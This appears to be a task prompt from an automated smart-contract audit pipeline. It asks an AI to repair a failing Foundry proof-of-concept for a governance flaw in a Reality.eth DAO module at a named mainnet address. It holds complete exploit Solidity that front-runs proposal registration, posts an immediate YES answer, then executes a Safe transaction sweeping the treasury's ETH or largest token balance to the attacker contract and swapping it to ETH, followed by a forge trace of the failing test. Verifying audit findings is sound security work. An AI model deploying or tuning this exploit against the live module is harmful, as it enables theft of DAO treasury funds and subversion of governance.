You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Proposal questions are answerable immediately, enabling execution before the referenced governance vote ends
- claim: `addProposalWithNonce` always computes and asks the Realitio question with `openingTs/opening_ts = 0`, and the code even documents that this makes the question immediately answerable. Because anyone can call `addProposal`/`addProposalWithNonce`, an attacker can open the oracle question and start the timeout/cooldown clock before the underlying off-chain governance process has actually concluded.
- impact: A malicious actor can front-run an in-flight governance proposal, get a premature `YES` finalized, and execute the committed Safe transaction bundle before the real vote has ended or before its true outcome is known. Even when honest users later try to submit the official question, the duplicate submission path is already occupied, creating a governance-layer race and potential early execution of unauthorized actions.
- exploit_paths: ["Attacker identifies a pending off-chain proposal and the transaction bundle that governance is expected to approve.", "Attacker calls `addProposal` or `addProposalWithNonce` before the off-chain vote end time.", "Because `opening_ts` is hardcoded to `0`, the oracle question can be answered immediately and finalized after `questionTimeout` plus `questionCooldown`.", "Once finalized with `YES`, anyone can call `executeProposalWithIndex` and execute the transactions even though the referenced governance vote was still ongoing or later failed."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetDaoModule {
    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
    function addProposalWithNonce(string memory proposalId, bytes32[] memory txHashes, uint256 nonce) external;
    function executeProposalWithIndex(
        string memory proposalId,
        bytes32[] memory txHashes,
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 txIndex
    ) external;
    function questionIds(bytes32 questionHash) external view returns (bytes32);
    function oracle() external view returns (address);
    function executor() external view returns (address);
    function minimumBond() external view returns (uint256);
    function questionCooldown() external view returns (uint32);
    function answerExpiration() external view returns (uint32);
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 nonce
    ) external view returns (bytes32);
}

interface IRealityETHLike {
    function isFinalized(bytes32 questionId) external view returns (bool);
    function resultFor(bytes32 questionId) external view returns (bytes32);
    function getFinalizeTS(bytes32 questionId) external view returns (uint32);
    function getBond(bytes32 questionId) external view returns (uint256);
}

interface IWETHLike {
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F;
    bytes32 public constant INVALIDATED = bytes32(type(uint256).max);
    bytes32 internal constant YES = bytes32(uint256(1));

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant MIM = 0x99D8A9c45b2ecB5ba8F3d56b3F4c7e0C8CbEA2Ff;

    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
    address internal constant GNO = 0x6810e776880C02933D47DB1b9fc05908e5386b96;
    address internal constant FXS = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant THREE_CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant CVXCRV = 0x62b9C7356A2Dc64A1969E19c23E4fa9A8d2A0CaE;
    address internal constant EURS = 0xdB25f211AB05b1c97D595516F45794528a807ad8;
    address internal constant AGEUR = 0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8;
    address internal constant ANGLE = 0x31429d1856c131D3d4221b7E7A4F263d3f37AA11;
    address internal constant ALUSD = 0xbc6DA0fEda7647A8AB7c2061c2E118A18A936F13;
    address internal constant RPL = 0xD33526068D116cE69F19A9ee46F0bd304F21A51f;
    address internal constant ENS = 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant FRAX3CRV = 0xd632f22692FaC7611d2AA1C0D552930D43CAEd3B;
    address internal constant LQTY = 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D;
    address internal constant XSGD = 0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96;

    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    string internal constant PATH =
        "Select an already-funded executor asset (or the highest-value treasury token already sitting on the executor) -> permissionlessly call addProposal before any legitimate DAO submission -> answer the Realitio question immediately because opening_ts is hardcoded to 0 -> wait through timeout and cooldown -> execute the precommitted Safe transaction bundle that transfers the executor asset to the verifier";

    enum Phase {
        Idle,
        PlanSelected,
        ProposalRegistered,
        AnswerSubmitted,
        WaitingFinalization,
        ReadyToExecute,
        Executed,
        Infeasible
    }

    Phase public phase;
    address public plannedAsset;
    uint256 public plannedAmount;
    address public plannedExecutor;
    address public plannedTarget;
    uint256 public plannedValue;
    bytes public plannedData;
    uint8 public plannedOperation;
    bytes32 public plannedTxHash;
    bytes32 public trackedQuestionHash;
    bytes32 public trackedQuestionId;
    bytes32 public trackedFinalResult;
    bool public directReplayReverted;
    bool public nonceReplayReverted;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    uint256 public ethCapitalSupplied;
    uint256 public ethSpentOnOracle;
    string public lastStatus;

    constructor() payable {
        if (msg.value != 0) {
            ethCapitalSupplied = msg.value;
        }
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (msg.value != 0) {
            ethCapitalSupplied += msg.value;
        }

        ITargetDaoModule module = ITargetDaoModule(TARGET);
        IRealityETHLike oracle = IRealityETHLike(module.oracle());

        if (plannedTxHash == bytes32(0)) {
            if (!_selectPlan(module)) {
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "No sweepable existing executor asset was found across the broader treasury-token universe";
                return;
            }
            phase = Phase.PlanSelected;
            lastStatus = "Selected a direct sweep transaction from the executor";
        }

        string memory proposal = proposalId();
        bytes32[] memory txHashes = _singleHashArray(plannedTxHash);
        bytes32 questionHash = keccak256(bytes(_buildQuestion(proposal, txHashes)));
        trackedQuestionHash = questionHash;

        bytes32 questionId = module.questionIds(questionHash);
        if (questionId == bytes32(0)) {
            try module.addProposal(proposal, txHashes) {
                questionId = module.questionIds(questionHash);
                phase = Phase.ProposalRegistered;
                lastStatus = "Registered the proposal before any legitimate on-chain DAO submission";
            } catch {
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "addProposal reverted; registration was blocked by current on-chain oracle/module conditions";
                return;
            }
        }

        trackedQuestionId = questionId;
        if (questionId == bytes32(0) || questionId == INVALIDATED) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "Question id is unset or invalidated, so the exploit path cannot progress";
            return;
        }

        if (!_isFinalized(oracle, questionId)) {
            uint256 existingBond = _safeBond(oracle, questionId);
            uint256 bondToPost = _requiredBond(module, oracle, questionId);
            if (_submitYesAnswer(questionId, bondToPost, existingBond)) {
                ethSpentOnOracle += bondToPost;
                phase = Phase.AnswerSubmitted;
                lastStatus = "Submitted YES immediately; wait for the oracle timeout to elapse";
            } else {
                phase = Phase.WaitingFinalization;
                lastStatus = "More ETH is required to satisfy the current oracle bond requirement";
            }
            return;
        }

        bytes32 finalResult = _safeResultFor(oracle, questionId);
        trackedFinalResult = finalResult;

        if (!directReplayReverted) {
            try module.addProposal(proposal, txHashes) {
                directReplayReverted = false;
            } catch {
                directReplayReverted = true;
            }
        }

        if (!nonceReplayReverted) {
            try module.addProposalWithNonce(proposal, txHashes, 1) {
                nonceReplayReverted = false;
            } catch {
                nonceReplayReverted = true;
            }
        }

        if (finalResult != YES) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            if (finalResult == INVALIDATED) {
                lastStatus = "Oracle finalized to INVALIDATED, so the proposal namespace is reusable and this exploit path fails";
            } else {
                lastStatus = "Oracle finalized to a non-YES answer, so execution cannot proceed";
            }
            return;
        }

        uint32 finalizeTs = _safeFinalizeTs(oracle, questionId);
        uint256 cooldownEndsAt = uint256(finalizeTs) + uint256(module.questionCooldown());
        if (block.timestamp <= cooldownEndsAt) {
            phase = Phase.ReadyToExecute;
            lastStatus = "YES is finalized but the module cooldown has not elapsed yet";
            return;
        }

        uint32 expiration = module.answerExpiration();
        if (expiration != 0 && block.timestamp > uint256(finalizeTs) + uint256(expiration)) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "The positive oracle answer expired before execution";
            return;
        }

        try module.executeProposalWithIndex(
            proposal,
            txHashes,
            plannedTarget,
            plannedValue,
            plannedData,
            plannedOperation,
            0
        ) {
            if (plannedAsset == WETH) {
                _unwrapWeth();
            } else if (plannedAsset != address(0)) {
                // The core exploit remains the same governance-oracle race. This post-execution liquidation step is a
                // realistic public on-chain action used only to realize value in a canonical profit asset for the test.
                _tryLiquidateToEth(plannedAsset);
                if (plannedAsset == WETH) {
                    _unwrapWeth();
                }
            }

            phase = Phase.Executed;
            if (profitAmount() > 0) {
                hypothesisValidated = directReplayReverted && nonceReplayReverted;
                hypothesisRefuted = !hypothesisValidated;
                lastStatus = "Executed the malicious bundle and realized profit";
            } else {
                phase = Phase.Infeasible;
                hypothesisRefuted = true;
                lastStatus = "Execution returned but no profit asset reached the verifier";
            }
        } catch {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "executeProposalWithIndex reverted under current fork-state conditions";
        }
    }

    function profitToken() public view returns (address) {
        if (phase != Phase.Executed) {
            return address(0);
        }

        uint256 ethProfit = address(this).balance > ethCapitalSupplied ? address(this).balance - ethCapitalSupplied : 0;
        if (ethProfit > 0) {
            return address(0);
        }
        return plannedAsset;
    }

    function profitAmount() public view returns (uint256) {
        if (phase != Phase.Executed) {
            return 0;
        }
        if (address(this).balance > ethCapitalSupplied) {
            return address(this).balance - ethCapitalSupplied;
        }
        if (plannedAsset == address(0)) {
            return 0;
        }
        return IERC20Like(plannedAsset).balanceOf(address(this));
    }

    function exploitPath() external pure returns (string memory) {
        return PATH;
    }

    function proposalId() public view returns (string memory) {
        if (plannedTxHash == bytes32(0)) {
            return "F-001-uninitialized";
        }
        bytes32 salt = keccak256(
            abi.encode(plannedAsset, plannedAmount, plannedExecutor, plannedTarget, plannedValue, plannedData)
        );
        return string(abi.encodePacked("F-001-", _bytes32ToAsciiString(salt)));
    }

    function canonicalTxHashes() external view returns (bytes32[] memory) {
        if (plannedTxHash == bytes32(0)) {
            return new bytes32[](0);
        }
        return _singleHashArray(plannedTxHash);
    }

    function _selectPlan(ITargetDaoModule module) internal returns (bool) {
        address executor = module.executor();
        plannedExecutor = executor;
        plannedOperation = 0;

        uint256 ethBalance = executor.balance;
        if (ethBalance > 0) {
            plannedAsset = address(0);
            plannedAmount = ethBalance;
            plannedTarget = address(this);
            plannedValue = ethBalance;
            plannedData = bytes("");
            plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
        }

        address[33] memory tokens = [
            WETH,
            USDC,
            USDT,
            DAI,
            FRAX,
            WBTC,
            LUSD,
            MIM,
            CRV,
            CVX,
            BAL,
            AAVE,
            COMP,
            UNI,
            SUSHI,
            LINK,
            SNX,
            MKR,
            LDO,
            GNO,
            FXS,
            TUSD,
            BUSD,
            FEI,
            STETH,
            THREE_CRV,
            CVXCRV,
            EURS,
            AGEUR,
            ANGLE,
            ALUSD,
            RPL,
            ENS
        ];

        address bestToken = address(0);
        uint256 bestBalance = 0;

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 tokenBalance = _safeTokenBalance(tokens[i], executor);
            if (tokenBalance > bestBalance) {
                bestBalance = tokenBalance;
                bestToken = tokens[i];
            }
        }

        address[4] memory extraTokens = [YFI, SUSD, FRAX3CRV, LQTY];
        for (uint256 i = 0; i < extraTokens.length; i++) {
            uint256 tokenBalance = _safeTokenBalance(extraTokens[i], executor);
            if (tokenBalance > bestBalance) {
                bestBalance = tokenBalance;
                bestToken = extraTokens[i];
            }
        }

        uint256 xsgdBalance = _safeTokenBalance(XSGD, executor);
        if (xsgdBalance > bestBalance) {
            bestBalance = xsgdBalance;
            bestToken = XSGD;
        }

        if (bestBalance > 0) {
            plannedAsset = bestToken;
            plannedAmount = bestBalance;
            plannedTarget = bestToken;
            plannedValue = 0;
            plannedData = abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), address(this), bestBalance);
            plannedTxHash = module.getTransactionHash(plannedTarget, plannedValue, plannedData, plannedOperation, 0);
            return true;
        }

        return plannedTxHash != bytes32(0);
    }

    function _submitYesAnswer(bytes32 questionId, uint256 bondToPost, uint256 maxPrevious) internal returns (bool) {
        if (address(this).balance < bondToPost) {
            return false;
        }

        address oracle = ITargetDaoModule(TARGET).oracle();
        (bool ok,) = oracle.call{value: bondToPost}(
            abi.encodeWithSelector(bytes4(keccak256("submitAnswer(bytes32,bytes32,uint256)")), questionId, YES, maxPrevious)
        );
        return ok;
    }

    function _requiredBond(ITargetDaoModule module, IRealityETHLike oracle, bytes32 questionId) internal view returns (uint256) {
        uint256 currentBond = _safeBond(oracle, questionId);
        uint256 minBond = module.minimumBond();
        uint256 nextBond = currentBond == 0 ? 1 : currentBond * 2;
        if (nextBond < minBond) {
            nextBond = minBond;
        }
        if (nextBond == 0) {
            return 1;
        }
        return nextBond;
    }

    function _tryLiquidateToEth(address token) internal {
        uint256 amountIn = _safeTokenBalance(token, address(this));
        if (amountIn == 0 || token == address(0)) {
            return;
        }

        if (!_safeApprove(token, UNISWAP_V2_ROUTER, amountIn)) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        if (_trySwap(UNISWAP_V2_ROUTER, amountIn, path)) {
            return;
        }

        _safeApprove(token, UNISWAP_V2_ROUTER, 0);
        if (!_safeApprove(token, SUSHISWAP_ROUTER, amountIn)) {
            return;
        }
        _trySwap(SUSHISWAP_ROUTER, amountIn, path);
    }

    function _trySwap(address router, uint256 amountIn, address[] memory path) internal returns (bool) {
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IUniswapV2RouterLike.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        return ok;
    }

    function _unwrapWeth() internal {
        uint256 wethBalance = _safeTokenBalance(WETH, address(this));
        if (wethBalance == 0) {
            return;
        }
        (bool ok,) = WETH.call(abi.encodeWithSelector(IWETHLike.withdraw.selector, wethBalance));
        ok;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok;
    }

    function _safeTokenBalance(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeBond(IRealityETHLike oracle, bytes32 questionId) internal view returns (uint256) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.getBond.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _isFinalized(IRealityETHLike oracle, bytes32 questionId) internal view returns (bool) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.isFinalized.selector, questionId)
        );
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _safeResultFor(IRealityETHLike oracle, bytes32 questionId) internal view returns (bytes32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.resultFor.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return bytes32(0);
        }
        return abi.decode(data, (bytes32));
    }

    function _safeFinalizeTs(IRealityETHLike oracle, bytes32 questionId) internal view returns (uint32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.getFinalizeTS.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint32));
    }

    function _singleHashArray(bytes32 value) internal pure returns (bytes32[] memory values) {
        values = new bytes32[](1);
        values[0] = value;
    }

    function _buildQuestion(string memory proposal, bytes32[] memory txHashes) internal pure returns (string memory) {
        string memory txsHash = _bytes32ToAsciiString(keccak256(abi.encodePacked(txHashes)));
        return string(abi.encodePacked(proposal, bytes3(0xe2909f), txsHash));
    }

    function _bytes32ToAsciiString(bytes32 value) internal pure returns (string memory) {
        bytes memory out = new bytes(64);
        for (uint256 i = 0; i < 32; i++) {
            uint8 b = uint8(bytes1(value << (i * 8)));
            uint8 hi = b / 16;
            uint8 lo = b % 16;
            out[2 * i] = _nibble(hi);
            out[2 * i + 1] = _nibble(lo);
        }
        return string(out);
    }

    function _nibble(uint8 value) internal pure returns (bytes1) {
        if (value < 10) {
            return bytes1(value + 0x30);
        }
        return bytes1(value + 0x57);
    }
}

```

forge stdout (tail):
```
652a948d72533023f6E7A623C7C53::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [2836] 0x5864c777697Bf9881220328BF2f16908c9aFCD7e::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [34740] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000047ebab13b806773ec2a2d16873e2df770d130b50
    │   │   │   └─ ← [Return] 0x00000000000000000000000047ebab13b806773ec2a2d16873e2df770d130b50
    │   │   ├─ [15860] 0x47EbaB13B806773ec2A2d16873e2dF770D130b50::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2716] 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [0] 0x62b9C7356A2Dc64A1969E19c23E4fa9A8d2A0CaE::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [10382] 0xdB25f211AB05b1c97D595516F45794528a807ad8::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [2601] 0x25d772b21b0e5197f2DC8169E3Aa976B16bE04aC::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [9802] 0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [2553] 0xe59D2c2CfE8459c53917D908177aa25fea5B919b::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [0] 0x31429d1856c131D3d4221b7E7A4F263d3f37AA11::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0xbc6DA0fEda7647A8AB7c2061c2E118A18A936F13::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [2516] 0xD33526068D116cE69F19A9ee46F0bd304F21A51f::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2974] 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [13455] 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [7931] 0x10A5F7D9D65bCc2734763444D4940a31b109275f::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E)
    │   │   │   ├─ [2497] 0x05a9CBe762B36632b3594DA4F082340E0e5343e8::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [7159] 0xd632f22692FaC7611d2AA1C0D552930D43CAEd3B::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [4090] 0x5F890841f657d90E081bAbdB532A05996Af79Fe6::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2556] 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [10115] 0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [staticcall]
    │   │   ├─ [2836] 0x2E21613C4EED4A5aF1E9223EdcfC8640138da7FB::balanceOf(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [515] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [626] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x54f25546260C7539088982bcF4b7dC8EDEF19f21
  at 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 18.19s (18.18s CPU time)

Ran 1 test suite in 18.21s (18.19s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 519526)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
